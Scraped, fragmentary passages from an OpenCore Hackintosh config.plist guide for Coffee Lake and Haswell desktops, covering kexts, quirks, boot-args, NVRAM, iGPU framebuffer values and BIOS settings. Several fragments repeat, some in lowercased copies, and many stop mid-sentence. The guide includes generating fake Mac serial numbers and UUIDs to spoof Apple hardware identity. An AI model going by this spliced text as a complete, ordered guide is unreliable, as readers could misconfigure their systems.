newer, there seems to be a lot of issues with black screen using 07009B3E, if you get similar issues try swapping to 00009B3E\n\nWe also add 2 more properties, framebuffer-patch-enable and framebuffer-stolenmem. The first enables patching via WhateverGreen.kext, and the second sets the min stolen memory to 19MB. This is usually unnecessary, as this can be configured in BIOS(64MB recommended) but required when not available.\n\n * Note: Headless framebuffers(where the dGPU is the display out) do not need framebuffer-patch-enable and framebuffer-stolenmem\n\nFor users with black screen issues after verbose on B360, B365, H310, H370, Z390, please see the BusID iGPU patching page\n\nKEY                        TYPE   VALUE\nAAPL,ig-platform-id        Data   07009B3E\nframebuffer-patch-enable   Data   01000000\nframebuffer-stolenmem      Data   00003001\n\n(This is an example for a desktop UHD 630 without a dGPU and no BIOS options for iGPU memory)\n\nPciRoot(0x0)/Pci(0x1b,0x0)\n\nlayout-id\n\n * Applies AppleALC audio injection, you'll need to do your own research on which codec your motherboard has and match it with AppleALC's layout. AppleALC Supported Codecs.\n * You can delete this property outright as it's unused for us at this time\n\nFor us, we'll be using the boot-arg alcid=xxx instead to accomplish this. alcid will override all other layout-IDs present. More info on this is covered in the Post-Install Page\n\n\n# Delete\n\nRemoves device properties from the map, for us we can ignore this\n\n\n# Kernel\n\n\n\n\n# Add\n\nHere's where we specify which kexts to load, in what specific order to load, and what architectures each kext is meant for. By default we recommend leaving what ProperTree has done, however for 32-bit CPUs please see below:\n\nMore in-depth Info\n\nThe main thing you need to keep in mind is:\n\n * Load order\n   * Remember that any plugins should load after its dependencies\n   * This means kexts like Lilu must come before VirtualSMC, AppleALC, WhateverGreen, etc\n\nA reminder that ProperTree users can run Cmd/Ctrl + Shift + R to add all their kexts in the correct order without manually typing each kext out.\n\n * Arch\n   * Architectures supported by this kext\n   * Currently supported values are Any, i386 (32-bit), and x86_64 (64-bit)\n * BundlePath\n   * Name of the kext\n   * ex: Lilu.kext\n * Enabled\n   * Self-explanatory, either enables or disables the kext\n * ExecutablePath\n   * Path to the actual executable is hidden within the kext, you can see what path your kext has by right-clicking and selecting Show Package Contents. Generally, they'll be Contents/MacOS/Kext but some have kexts hidden within under Plugin folder. Do note that plist only kexts do not need this filled in.\n   * ex: Contents/MacOS/Lilu\n * MinKernel\n   * Lowest kernel version your kext will be injected into, see below table for possible values\n   * ex. 12.00.00 for OS X 10.8\n * MaxKernel\n   * Highest kernel version your kext will be injected into, see below table for possible values\n   * ex. 11.99.99 for OS X 10.7\n * PlistPath\n   * Path to the info.plist hidden within the kext\n   * ex: Contents/Info.plist\n\nKernel Support Table\n\nOS X VERSION   MINKERNEL   MAXKERNEL\n10.4           8.0.0       8.99.99\n10.5           9.0.0       9.99.99\n10.6           10.0.0      10.99.99\n10.7           11.0.0      11.99.99\n10.8           12.0.0      12.99.99\n10.9           13.0.0      13.99.99\n10.10          14.0.0      14.99.99\n10.11          15.0.0      15.99.99\n10.12          16.0.0      16.99.99\n10.13          17.0.0      17.99.99\n10.14          18.0.0      18.99.99\n10.15          19.0.0      19.99.99\n11             20.0.0      20.99.99\n12             21.0.0      21.99.99\n13             22.0.0      22.99.99\n\n\n# Emulate\n\nNeeded for spoofing unsupported CPUs like Pentiums and Celerons\n\n * Cpuid1Mask: Leave this blank\n * Cpuid1Data: Leave this blank\n\n\n# Force\n\nUsed for loading kexts off system volume, only relevant for older operating systems where certain kexts are not present in the cache(ie.

Usually relevant for Dell laptops\n   * Enabling this quirk with UpdateSMBIOSMode Custom mode can also disable SMBIOS injection into \"non-Apple\" OSes however we do not endorse this method as it breaks Bootcamp compatibility. Use at your own risk\n * DisableIoMapper: YES\n   * Needed to get around VT-D if either unable to disable in BIOS or needed for other operating systems, much better alternative to dart=0 as SIP can stay on in Catalina\n * DisableLinkeditJettison: YES\n   * Allows Lilu and others to have more reliable performance without keepsyms=1\n * DisableRtcChecksum: NO\n   * Prevents AppleRTC from writing to primary checksum (0x58-0x59), required for users who either receive BIOS reset or are sent into Safe mode after reboot/shutdown\n * ExtendBTFeatureFlags NO\n   * Helpful for those having continuity issues with non-Apple/non-Fenvi cards\n * LapicKernelPanic: NO\n   * Disables kernel panic on AP core lapic interrupt, generally needed for HP systems. Clover equivalent is Kernel LAPIC\n * LegacyCommpage: NO\n   * Resolves SSSE3 requirement for 64 Bit CPUs in macOS, mainly relevant for 64-Bit Pentium 4 CPUs(ie. Prescott)\n * PanicNoKextDump: YES\n   * Allows for reading kernel panics logs when kernel panics occur\n * PowerTimeoutKernelPanic: YES\n   * Helps fix kernel panics relating to power changes with Apple drivers in macOS Catalina, most notably with digital audio.\n * SetApfsTrimTimeout: -1\n   * Sets trim timeout in microseconds for APFS filesystems on SSDs, only applicable for macOS 10.14 and newer with problematic SSDs.\n * XhciPortLimit: YES\n   * This is actually the 15 port limit patch, don't rely on it as it's not a guaranteed solution for fixing USB. Please create a USB map when possible.\n   * With macOS 11.3+, XhciPortLimit may not function as intended. We recommend users either disable this quirk and map before upgrading or map from Windows.

It's invaluable\n              to any Hackintosher, as it gives you an inside look at the\n              boot process, and can help you identify issues, problem\n              kexts, etc.\ndebug=0x100   This disables macOS's watchdog which helps prevents a reboot\n              on a kernel panic. That way you can hopefully glean some\n              useful info and follow the breadcrumbs to get past the\n              issues.\nkeepsyms=1    This is a companion setting to debug=0x100 that tells the OS\n              to also print the symbols on a kernel panic. That can give\n              some more helpful insight as to what's causing the panic\n              itself.\nalcid=1       Used for setting layout-id for AppleALC, see supported\n              codecs to figure out which layout to use for your specific\n              system.

It is generally recommended to change this with csrutil via the recovery partition.\n   * csr-active-config by default is set to 00000000 which enables System Integrity Protection. You can choose a number of different values but overall we recommend keeping this enabled for best security practices. More info can be found in our troubleshooting page: Disabling SIP\n\n * run-efi-updater: No\n   \n   * This is used to prevent Apple's firmware update packages from installing and breaking boot order; this is important as these firmware updates (meant for Macs) will not work.\n\n * prev-lang:kbd: <>\n   \n   * Needed for non-latin keyboards in the format of lang-COUNTRY:keyboard, recommended to keep blank though you can specify it(Default in Sample config is Russian):\n   * American: en-US:0(656e2d55533a30 in HEX)\n   * Full list can be found in AppleKeyboardLayouts.txt\n   * Hint: prev-lang:kbd can be changed into a String so you can input en-US:0 directly instead of converting to HEX\n   * Hint 2: prev-lang:kbd can be set to a blank variable (eg. <>) which will force the Language Picker to appear instead at first boot up.\n\nKEY             TYPE     VALUE\nprev-lang:kbd   String   en-US:0\n\n\n# Delete\n\nInfo\n\nForcibly rewrites NVRAM variables, do note that Add will not overwrite values already present in NVRAM so values like boot-args should be left alone.

There are two main SMBIOS used for Coffee Lake:\n\nSMBIOS     HARDWARE\niMac19,1   For Mojave and newer\niMac18,3   For High Sierra and older\n\n * You'll use 18,3 when you have a Pascal or Maxwell dGPU and are limited to versions of macOS with Web Drivers\n\nRun GenSMBIOS, pick option 1 for downloading MacSerial and Option 3 for selecting out SMBIOS. This will give us an output similar to the following:\n\n  #######################################################\n #               iMac19,1 SMBIOS Info                  #\n#######################################################\n\nType:         iMac19,1\nSerial:       C02XG0FDH7JY\nBoard Serial: C02839303QXH69FJA\nSmUUID:       DBB364D6-44B2-4A02-B922-AB4396F16DA8\n\n\nThe Type part gets copied to Generic -> SystemProductName.\n\nThe Serial part gets copied to Generic -> SystemSerialNumber.\n\nThe Board Serial part gets copied to Generic -> MLB.\n\nThe SmUUID part gets copied to Generic -> SystemUUID.\n\nWe set Generic -> ROM to either an Apple ROM (dumped from a real Mac), your NIC MAC address, or any random MAC address (could be just 6 random bytes, for this guide we'll use 11223300 0000. After install follow the Fixing iServices page on how to find your real MAC Address)\n\nReminder that you need an invalid serial! When inputting your serial number in Apple's Check Coverage Page, you should get a message such as \"Unable to check coverage for this serial number.\"\n\nAutomatic: YES\n\n * Generates PlatformInfo based on Generic section instead of DataHub, NVRAM, and SMBIOS sections\n\n\n# Generic\n\nMore in-depth Info\n\n * AdviseFeatures: NO\n   \n   * Used for when the EFI partition isn't first on the Windows drive\n\n * MaxBIOSVersion: NO\n   \n   * Sets BIOS version to Max to avoid firmware updates in Big Sur+, mainly applicable for genuine Macs.\n\n * ProcessorType: 0\n   \n   * Set to 0 for automatic type detection, however this value can be overridden if desired. See AppleSmBios.h for possible values\n\n * SpoofVendor: YES\n   \n   * Swaps vendor field for Acidanthera, generally not safe to use Apple as a vendor in most case\n\n * SystemMemoryStatus: Auto\n   \n   * Sets whether memory is soldered or not in SMBIOS info, purely cosmetic and so we recommend Auto\n\n * UpdateDataHub: YES\n   \n   * Update Data Hub fields\n\n * UpdateNVRAM: YES\n   \n   * Update NVRAM fields\n\n * UpdateSMBIOS: YES\n   \n   * Updates SMBIOS fields\n\n * UpdateSMBIOSMode: Create\n   \n   * Replace the tables with newly allocated EfiReservedMemoryType, use Custom on Dell laptops requiring CustomSMBIOSGuid quirk\n   * Setting to Custom with CustomSMBIOSGuid quirk enabled can also disable SMBIOS injection into \"non-Apple\" OSes however we do not endorse this method as it breaks Bootcamp compatibility. Use at your own risk\n\n\n# UEFI\n\n\n\nConnectDrivers: YES\n\n * Forces .efi drivers, change to NO will automatically connect added UEFI drivers. This can make booting slightly faster, but not all drivers connect themselves. E.g. certain file system drivers may not load.\n\n\n# Drivers\n\nAdd your .efi drivers here.\n\nOnly drivers present here should be:\n\n * HfsPlus.efi\n * OpenRuntime.efi\n\nMore in-depth Info\n\nKEY         TYPE      DESCRIPTION\nPath        String    Path of the file from OC/Drivers directory\nLoadEarly   Boolean   Load the driver early before NVRAM setup, should only be\n                      enabled for OpenRuntime.efi and OpenVariableRuntimeDxe.efi\n                      if using legacy NVRAM\nArguments   String    Some drivers accept additional arguments which are specified\n                      here.\n\n\n# APFS\n\nBy default, OpenCore only loads APFS drivers from macOS Big Sur and newer. If you are booting macOS Catalina or earlier, you may need to set a new minimum version/date. Not setting this can result in OpenCore not finding your macOS partition!\n\nmacOS Sierra and earlier use HFS instead of APFS. You can skip this section if booting older versions of macOS.\n\nAPFS Versions\n\nBoth MinVersion and MinDate need to be set if changing the minimum version.\n\nMACOS VERSION           MIN VERSION        MIN DATE\nHigh Sierra (10.13.6)   748077008000000    20180621\nMojave (10.14.6)        945275007000000    20190820\nCatalina (10.15.4)      1412101001000000   20200306\nNo restriction          -1                 -1\n\n\n# Audio\n\nRelated to AudioDxe settings, for us we'll be ignoring(leave as default).

told explicitly so. if the guide doesn't mention the option, leave it at default.\n * the sample.plist cannot be used as-is, you must configure it to your system\n * do not use configurators, these rarely respect opencore's configuration and even some like mackie's will add clover properties and corrupt plists!\n\nnow with all that, a quick reminder of the tools we need\n\n * propertree\n   *

memory allocation issues on z390. requires protectuefiservices as well on icelake and z390 coffee lake.\n * enablesafemodeslide: yes\n   * enables slide variables to be used in safe mode.\n * enablewriteunprotector: no\n   * this quirk and rebuildapplememorymap can commonly conflict, recommended to enable the latter on newer platforms and disable this entry.\n   * however, due to issues with oems not using the latest edkii builds you may find that the above combo will result in early boot failures. this is due to missing the memory_attribute_table and such we recommend disabling rebuildapplememorymap and enabling enablewriteunprotector. more info on this is covered in the troubleshooting section.\n * protectuefiservices: no\n   * protects uefi services from being overridden by the firmware, mainly relevant for vms, icelake and z390 systems'.\n   * if on z390, enable this quirk.\n * providecustomslide: yes\n   * used for slide variable calculation. however the necessity of this quirk is determined by ocabc: only n/256 slide values are usable! message in the debug log. if the message ocabc: all slides are usable! you can disable providecustomslide! is present in your log, you can disable providecustomslide.\n * rebuildapplememorymap: yes\n   * generates memory map compatible with macos, can break on some laptop oem firmwares so if you receive early boot failures disable this.\n * resizeapplegpubars: -1\n   * will reduce the size of gpu pci bars if set to 0 when booting macos, set to -1 to disable\n   * setting other pci bar values is possible with this quirk, though can cause instabilities\n   * this quirk being set to zero is only necessary if resizable bar support is enabled in your firmware.\n * setupvirtualmap: yes\n   * fixes setvirtualaddresses calls to virtual addresses, shouldn't be needed on skylake and newer. some firmware like gigabyte may still require it, and will kernel panic without this.\n * syncruntimepermissions: yes\n   * fixes

is only used for computing tasks\n                      and doesn't drive a display\n\n * note: with macos 10.15.5 and newer, there seems to be a lot of issues with black screen using 07009b3e, if you get similar issues try swapping to 00009b3e\n\nwe also add 2 more properties, framebuffer-patch-enable and framebuffer-stolenmem. the first enables patching via whatevergreen.kext, and the second sets the min stolen memory to 19mb. this is usually unnecessary, as this can be configured in bios(64mb recommended) but required when not available.\n\n * note: headless framebuffers(where the dgpu is the display out) do not need framebuffer-patch-enable and framebuffer-stolenmem\n\nfor users with black screen issues after verbose on b360, b365, h310, h370, z390, please see the busid igpu patching

a 32-bit kernel(ie. 10.4 and 10.5) we recommend to set this to auto and let macos decide based on your smbios. see below table for supported values:\n     * 10.4-10.5 — x86_64, i386 or i386-user32\n       * i386-user32 refers 32-bit userspace, so 32-bit cpus must use this(or cpus missing ssse3)\n       * x86_64 will still have a 32-bit kernelspace however will ensure 64-bit userspace in 10.4/5\n     * 10.6 — i386, i386-user32, or x86_64\n     * 10.7 — i386 or x86_64\n     * 10.8 or newer — x86_64\n\n * kernelcache: auto\n   \n   * set kernel cache type, mainly useful for debugging and so we

booting\n              instead of the apple logo and progress bar. it's invaluable\n              to any hackintosher, as it gives you an inside look at the\n              boot process, and can help you identify issues, problem\n              kexts, etc.\ndebug=0x100   this disables macos's watchdog which helps prevents a reboot\n              on a kernel panic. that way you can hopefully glean some\n              useful info and follow the breadcrumbs to get past the\n              issues.\nkeepsyms=1    this is a companion setting to debug=0x100 that tells the os\n              to also

application.\n\nfor this coffee lake example, we'll chose the imac19,1 smbios - this is done intentionally for compatibility's sake. there are two main smbios used for coffee lake:\n\nsmbios     hardware\nimac19,1   for mojave and newer\nimac18,3   for high sierra and older\n\n * you'll use 18,3 when you have a pascal or maxwell dgpu and are limited to versions of macos with web drivers\n\nrun gensmbios, pick option 1 for downloading macserial and option 3 for selecting out smbios. this will give us an output similar to the following:\n\n

It just takes some time but this guide will tell you how to configure everything, you won't be left in the cold. This also means if you have issues, review your config settings to make sure they're correct. Main things to note with OpenCore:\n\n * All properties must be defined, there are no default OpenCore will fall back on so do not delete sections unless told explicitly so. If the guide doesn't mention the option, leave it at default.\n * The Sample.plist cannot be used As-Is, you must configure it to your system\n * DO NOT USE CONFIGURATORS, these rarely respect OpenCore's configuration and even some like Mackie's will add Clover properties and corrupt plists!\n\nNow with all that, a quick reminder of the tools we need\n\n * ProperTree\n   * Universal plist editor\n * GenSMBIOS\n   * For generating our SMBIOS data\n * Sample/config.plist\n   * See previous section on how to obtain: config.plist Setup\n\nWARNING\n\nRead this guide more than once before setting up OpenCore and make sure you have it set up correctly. Do note that images will not always be the most up-to-date so please read the text below them, if nothing's mentioned then leave as default.\n\n\n# ACPI\n\n\n\n\n# Add\n\nInfo\n\nThis is where you'll add SSDTs for your system, these are very important to booting macOS and have many uses like USB maps, disabling unsupported GPUs and such. And with our system, it's even required to boot. Guide on making them found here: Getting started with ACPI\n\nFor us we'll need a couple of SSDTs to bring back functionality that Clover provided:\n\nREQUIRED SSDTS   DESCRIPTION\nSSDT-PLUG        Allows for native CPU power management on Haswell and newer,\n                 see Getting Started With ACPI Guide for more details.\nSSDT-EC          Fixes the embedded controller, see Getting Started With ACPI\n                 Guide for more details.\n\nNote that you should not add your generated DSDT.aml here, it is already in your firmware. So if present, remove the entry for it in your config.plist and under EFI/OC/ACPI.\n\nFor those wanting a deeper dive into dumping your DSDT, how to make these SSDTs, and compiling them, please see the Getting started with ACPI page. Compiled SSDTs have a .aml extension(Assembled) and will go into the EFI/OC/ACPI folder and must be specified in your config under ACPI -> Add as well.\n\n\n# Delete\n\nThis blocks certain ACPI tables from loading, for us we can ignore this.\n\n\n# Patch\n\nThis section allows us to dynamically modify parts of the ACPI (DSDT, SSDT, etc.) via OpenCore. For us, our patches are handled by our SSDTs. This is a much cleaner solution as this will allow us to boot Windows and other OSes with OpenCore\n\n\n# Quirks\n\nSettings relating to ACPI, leave everything here as default as we have no use for these quirks.\n\n\n# Booter\n\n\n\nThis section is dedicated to quirks relating to boot.efi patching with OpenRuntime, the replacement for AptioMemoryFix.efi\n\n\n# MmioWhitelist\n\nThis section is allowing spaces to be passthrough to macOS that are generally ignored, useful when paired with DevirtualiseMmio\n\n\n# Quirks\n\nInfo\n\nSettings relating to boot.efi patching and firmware fixes, for us, we leave it as default\n\nMore in-depth Info\n * AvoidRuntimeDefrag: YES\n   * Fixes UEFI runtime services like date, time, NVRAM, power control, etc.\n * EnableSafeModeSlide: YES\n   * Enables slide variables to be used in safe mode, however this quirk is only applicable to UEFI platforms.\n * EnableWriteUnprotector: YES\n   * Needed to remove write protection from CR0 register.\n * ProvideCustomSlide: YES\n   * Used for Slide variable calculation. However the necessity of this quirk is determined by OCABC: Only N/256 slide values are usable! message in the debug log. If the message OCABC: All slides are usable! You can disable ProvideCustomSlide! is present in your log, you can disable ProvideCustomSlide.\n * SetupVirtualMap: YES\n   * Fixes SetVirtualAddresses calls to virtual addresses, required for Gigabyte boards to resolve early kernel panics.\n\n\n# DeviceProperties\n\n\n\n\n# Add\n\nSets device properties from a map.\n\nPciRoot(0x0)/Pci(0x2,0x0)\n\nThis section is set up via WhateverGreen's Framebuffer Patching Guide and is used for setting important iGPU properties.\n\nThe config.plist doesn't already have a section for this so you will have to create it manually.\n\nAAPL,ig-platform-id is what macOS uses to determine how the iGPU drivers interact with our system, and the two values choose between are as follows:\n\nAAPL,IG-PLATFORM-ID   COMMENT\n0300220D              Used when the Desktop Haswell iGPU is used to drive a\n                      display\n04001204              Used when the Desktop Haswell iGPU is only used for\n                      computing tasks and doesn't drive a display\n07002216              Used when the Desktop Broadwell iGPU is used to drive a\n                      display\n\nI added another portion as well that shows a device-id fake in case you have an HD 4400 which is unsupported in macOS.\n\nThe device-id fake is set up like so:\n\n * 12040000 - this is the device id for HD 4600 which does have support in macOS\n\nWe also add 3 more properties, framebuffer-patch-enable, framebuffer-stolenmem and framebuffer-fbmem. The first enables patching via WhateverGreen.kext, the second sets the min stolen memory to 19MB and third sets the framebuffer memory to 9MB. This is usually unnecessary, as this can be configured in BIOS(64MB recommended) but required when not available.\n\n * Note: Headless framebuffers(where the dGPU is the display out) do not need framebuffer-patch-enable, framebuffer-stolenmem and framebuffer-fbmem\n\nKEY                        TYPE   VALUE\nAAPL,ig-platform-id        Data   0300220D\nframebuffer-patch-enable   Data   01000000\nframebuffer-stolenmem      Data   00003001\nframebuffer-fbmem          Data   00009000\ndevice-id                  Data   12040000\n\n(This is an example for a desktop HD 4400 without a dGPU and no BIOS options for iGPU memory)\n\nKEY                        TYPE   VALUE\nAAPL,ig-platform-id        Data   07002216\nframebuffer-patch-enable   Data   01000000\nframebuffer-stolenmem      Data   00003001\nframebuffer-fbmem          Data   00009000\n\n(This is an example for a desktop Iris Pro 6200 and no BIOS options for iGPU memory)\n\nPciRoot(0x0)/Pci(0x1b,0x0)\n\nlayout-id\n\n * Applies AppleALC audio injection, you'll need to do your own research on which codec your motherboard has and match it with AppleALC's layout. AppleALC Supported Codecs.\n * You can delete this property outright as it's unused for us at this time\n\nFor us, we'll be using the boot-arg alcid=xxx instead to accomplish this. alcid will override all other layout-IDs present.

Can be considered a security risk so optional\n\n * BlacklistAppleUpdate: YES\n   \n   * Used for blocking firmware updates, used as extra level of protection as macOS Big Sur no longer uses run-efi-updater variable\n\n * DmgLoading: Signed\n   \n   * Ensures only signed DMGs load\n\n * ExposeSensitiveData: 6\n   \n   * Shows more debug information, requires debug version of OpenCore\n\n * Vault: Optional\n   \n   * We won't be dealing vaulting so we can ignore, you won't boot with this set to Secure\n   * This is a word, it is not optional to omit this setting. You will regret it if you don't set it to Optional, note that it is case-sensitive\n\n * ScanPolicy: 0\n   \n   * 0 allows you to see all drives available, please refer to Security section for further details. Will not boot USB devices with this set to default\n\n * SecureBootModel: Default\n   \n   * Controls Apple's secure boot functionality in macOS, please refer to Security section for further details.\n   * Note: Users may find upgrading OpenCore on an already installed system can result in early boot failures. To resolve this, see here: Stuck on OCB: LoadImage failed - Security Violation\n\n\n# Serial\n\nUsed for serial debugging (Leave everything as default).\n\n\n# Tools\n\nUsed for running OC debugging tools like the shell, ProperTree's snapshot function will add these for you.\n\n\n# Entries\n\nUsed for specifying irregular boot paths that can't be found naturally with OpenCore.\n\nWon't be covered here, see 8.6 of Configuration.pdf for more info\n\n\n# NVRAM\n\n\n\n\n# Add\n\n4D1EDE05-38C7-4A6A-9CC6-4BCCA8B38C14\n\nUsed for OpenCore's UI scaling, default will work for us.

It's invaluable\n              to any Hackintosher, as it gives you an inside look at the\n              boot process, and can help you identify issues, problem\n              kexts, etc.\ndebug=0x100   This disables macOS's watchdog which helps prevents a reboot\n              on a kernel panic. That way you can hopefully glean some\n              useful info and follow the breadcrumbs to get past the\n              issues.\nkeepsyms=1    This is a companion setting to debug=0x100 that tells the OS\n              to also print the symbols on a kernel panic. That can give\n              some more helpful insight as to what's causing the panic\n              itself.\nalcid=1       Used for setting layout-id for AppleALC, see supported\n              codecs to figure out which layout to use for your specific\n              system. More info on this is covered in the Post-Install\n              Page\n\n * GPU-Specific boot-args:\n\nBOOT-ARGS        DESCRIPTION\nagdpmod=pikera   Used for disabling board ID checks on some Navi GPUs (RX\n                 5000 & 6000 series), without this you'll get a black screen.\n                 Don't use if you don't have Navi (ie. Polaris and Vega cards\n                 shouldn't use this)\n-radcodec        Used for allowing officially unsupported AMD GPUs (spoofed)\n                 to use the Hardware Video Encoder\nradpg=15         Used for disabling some power-gating modes, helpful for\n                 properly initializing AMD Cape Verde based GPUs\nunfairgva=1      Used for fixing hardware DRM support on supported AMD GPUs\nnvda_drv_vrl=1   Used for enabling NVIDIA's Web Drivers on Maxwell and Pascal\n                 cards in macOS Sierra and High Sierra\n-wegnoegpu       Used for disabling all other GPUs than the integrated Intel\n                 iGPU, useful for those wanting to run newer versions of\n                 macOS where their dGPU isn't supported\n\n * csr-active-config: 00000000\n   \n   * Settings for 'System Integrity Protection' (SIP). It is generally recommended to change this with csrutil via the recovery partition.\n   * csr-active-config by default is set to 00000000 which enables System Integrity Protection. You can choose a number of different values but overall we recommend keeping this enabled for best security practices. More info can be found in our troubleshooting page: Disabling SIP\n\n * run-efi-updater: No\n   \n   * This is used to prevent Apple's firmware update packages from installing and breaking boot order; this is important as these firmware updates (meant for Macs) will not work.\n\n * prev-lang:kbd: <>\n   \n   * Needed for non-latin keyboards in the format of lang-COUNTRY:keyboard, recommended to keep blank though you can specify it(Default in Sample config is Russian):\n   * American: en-US:0(656e2d55533a30 in HEX)\n   * Full list can be found in AppleKeyboardLayouts.txt\n   * Hint: prev-lang:kbd can be changed into a String so you can input en-US:0 directly instead of converting to HEX\n   * Hint 2: prev-lang:kbd can be set to a blank variable (eg. <>) which will force the Language Picker to appear instead at first boot up.\n\nKEY             TYPE     VALUE\nprev-lang:kbd   String   en-US:0\n\n\n# Delete\n\nInfo\n\nForcibly rewrites NVRAM variables, do note that Add will not overwrite values already present in NVRAM so values like boot-args should be left alone. For us, we'll be changing the following:\n\nQUIRK        ENABLED\nWriteFlash   YES\n\nMore in-depth Info\n\n * LegacySchema\n   \n   * Used for assigning NVRAM variables, used with OpenVariableRuntimeDxe.efi. Only needed for systems without native NVRAM\n\n * WriteFlash: YES\n   \n   * Enables writing to flash memory for all added variables.\n\n\n# PlatformInfo\n\n\n\nInfo\n\nFor setting up the SMBIOS info, we'll use CorpNewt's GenSMBIOS application.\n\nFor this Haswell example, we chose the iMac15,1 SMBIOS. The typical breakdown is as follows:\n\nSMBIOS     HARDWARE\niMac14,4   Haswell with only iGPU\niMac15,1   Haswell with dGPU\niMac16,2   Broadwell\n\nNote: The following SMBIOS are only supported up-to macOS 11, Big Sur. For cases where you must boot Monterey, see below:\n\nMonterey SMBIOS table\n\nNote choosing a SMBIOS from the list below for Big Sur or older is not recommended, as Power Management and such can break when using unoptimized SMBIOS.\n\nMonterey table:\n\nSMBIOS     HARDWARE\niMac16,2   Broadwell with only iGPU\niMac17,1   Broadwell with dGPU\n\nNote 2: All of these SMBIOSes were dropped in macOS Ventura. If running macOS Ventura, use a Kaby Lake SMBIOS.\n\nRun GenSMBIOS, pick option 1 for downloading MacSerial and Option 3 for selecting out SMBIOS. This will give us an output similar to the following:\n\n  #######################################################\n #               iMac15,1 SMBIOS Info                  #\n#######################################################\n\nType:         iMac15,1\nSerial:       C02M9SYJFY10\nBoard Serial: C02408101J9G2Y7A8\nSmUUID:       7B227BEC-660D-405F-8E60-411B3E4EF055\n\n\nThe Type part gets copied to Generic -> SystemProductName.\n\nThe Serial part gets copied to Generic -> SystemSerialNumber.\n\nThe Board Serial part gets copied to Generic -> MLB.\n\nThe SmUUID part gets copied to Generic -> SystemUUID.\n\nWe set Generic -> ROM to either an Apple ROM (dumped from a real Mac), your NIC MAC address, or any random MAC address (could be just 6 random bytes, for this guide we'll use 11223300 0000. After install follow the Fixing iServices page on how to find your real MAC Address)\n\nReminder that you need an invalid serial! When inputting your serial number in Apple's Check Coverage Page, you should get a message such as \"Unable to check coverage for this serial number.\"\n\nAutomatic: YES\n\n * Generates PlatformInfo based on Generic section instead of DataHub, NVRAM, and SMBIOS sections\n\n:::\n\n\n# Generic\n\nMore in-depth Info\n\n * AdviseFeatures: NO\n   \n   * Used for when the EFI partition isn't first on the Windows drive\n\n * MaxBIOSVersion: NO\n   \n   * Sets BIOS version to Max to avoid firmware updates in Big Sur+, mainly applicable for genuine Macs.\n\n * ProcessorType: 0\n   \n   * Set to 0 for automatic type detection, however this value can be overridden if desired. See AppleSmBios.h for possible values\n\n * SpoofVendor: YES\n   \n   * Swaps vendor field for Acidanthera, generally not safe to use Apple as a vendor in most case\n\n * SystemMemoryStatus: Auto\n   \n   * Sets whether memory is soldered or not in SMBIOS info, purely cosmetic and so we recommend Auto\n\n * UpdateDataHub: YES\n   \n   * Update Data Hub fields\n\n * UpdateNVRAM: YES\n   \n   * Update NVRAM fields\n\n * UpdateSMBIOS: YES\n   \n   * Updates SMBIOS fields\n\n * UpdateSMBIOSMode: Create\n   \n   * Replace the tables with newly allocated EfiReservedMemoryType, use Custom on Dell laptops requiring CustomSMBIOSGuid quirk\n   * Setting to Custom with CustomSMBIOSGuid quirk enabled can also disable SMBIOS injection into \"non-Apple\" OSes however we do not endorse this method as it breaks Bootcamp compatibility. Use at your own risk\n\n\n# UEFI\n\n\n\nConnectDrivers: YES\n\n * Forces .efi drivers, change to NO will automatically connect added UEFI drivers. This can make booting slightly faster, but not all drivers connect themselves. E.g. certain file system drivers may not load.\n\n\n# Drivers\n\nAdd your .efi drivers here.\n\nOnly drivers present here should be:\n\n * HfsPlus.efi\n * OpenRuntime.efi\n\nMore in-depth Info\n\nKEY         TYPE      DESCRIPTION\nPath        String    Path of the file from OC/Drivers directory\nLoadEarly   Boolean   Load the driver early before NVRAM setup, should only be\n                      enabled for OpenRuntime.efi and OpenVariableRuntimeDxe.efi\n                      if using legacy NVRAM\nArguments   String    Some drivers accept additional arguments which are specified\n                      here.\n\n\n# APFS\n\nBy default, OpenCore only loads APFS drivers from macOS Big Sur and newer. If you are booting macOS Catalina or earlier, you may need to set a new minimum version/date. Not setting this can result in OpenCore not finding your macOS partition!\n\nmacOS Sierra and earlier use HFS instead of APFS. You can skip this section if booting older versions of macOS.\n\nAPFS Versions\n\nBoth MinVersion and MinDate need to be set if changing the minimum version.\n\nMACOS VERSION           MIN VERSION        MIN DATE\nHigh Sierra (10.13.6)   748077008000000    20180621\nMojave (10.14.6)        945275007000000    20190820\nCatalina (10.15.4)      1412101001000000   20200306\nNo restriction          -1                 -1\n\n\n# Audio\n\nRelated to AudioDxe settings, for us we'll be ignoring(leave as default). This is unrelated to audio support in macOS.\n\n * For further use of AudioDxe and the Audio section, please see the Post Install page: Add GUI and Boot-chime\n\n\n# Input\n\nRelated to boot.efi keyboard passthrough used for FileVault and Hotkey support, leave everything here as default as we have no use for these quirks.

See here for more details: Security and FileVault\n\n\n# Quirks\n\nInfo\n\nRelating to quirks with the UEFI environment, for us we'll be changing the following:\n\nQUIRK                    ENABLED   COMMENT\nIgnoreInvalidFlexRatio   YES       \nUnblockFsConnect         NO        Needed mainly by HP motherboards\n\nMore in-depth Info\n\n * IgnoreInvalidFlexRatio: YES\n   \n   * Fix for when MSR_FLEX_RATIO (0x194) can't be disabled in the BIOS, required for all pre-Skylake based systems\n\n * DisableSecurityPolicy: NO\n   \n   * Disables platform security policy in firmware, recommended for buggy firmwares where disabling Secure Boot does not allow 3rd party firmware drivers to load.\n   * If running a Microsoft Surface device, recommended to enable this option\n\n * RequestBootVarRouting: YES\n   \n   * Redirects AptioMemoryFix from EFI_GLOBAL_VARIABLE_GUID to OC_VENDOR_VARIABLE_GUID. Needed for when firmware tries to delete boot entries and is recommended to be enabled on all systems for correct update installation, Startup Disk control panel functioning, etc.\n\n * UnblockFsConnect: NO\n   \n   * Some firmware block partition handles by opening them in By Driver mode, which results in File System protocols being unable to install. Mainly relevant for HP systems when no drives are listed\n\n\n# ReservedMemory\n\nUsed for exempting certain memory regions from OSes to use, mainly relevant for Sandy Bridge iGPUs or systems with faulty memory. Use of this quirk is not covered in this guide\n\n\n# Cleaning up\n\nAnd now you're ready to save and place it into your EFI under EFI/OC.\n\nFor those having booting issues, please make sure to read the Troubleshooting section first and if your questions are still unanswered we have plenty of resources at your disposal:\n\n * r/Hackintosh Subreddit\n * r/Hackintosh Discord\n\n\n# Intel BIOS settings\n\n * Note: Most of these options may not be present in your firmware, we recommend matching up as closely as possible but don't be too concerned if many of these options are not available in your BIOS\n\n\n# Disable\n\n * Fast Boot\n * Secure Boot\n * Serial/COM Port\n * Parallel Port\n * VT-d (can be enabled if you set DisableIoMapper to YES)\n * Compatibility Support Module (CSM) (Must be off in most cases, GPU errors/stalls like gIO are common when this option is enabled)\n * Thunderbolt (For initial install, as Thunderbolt can cause issues if not 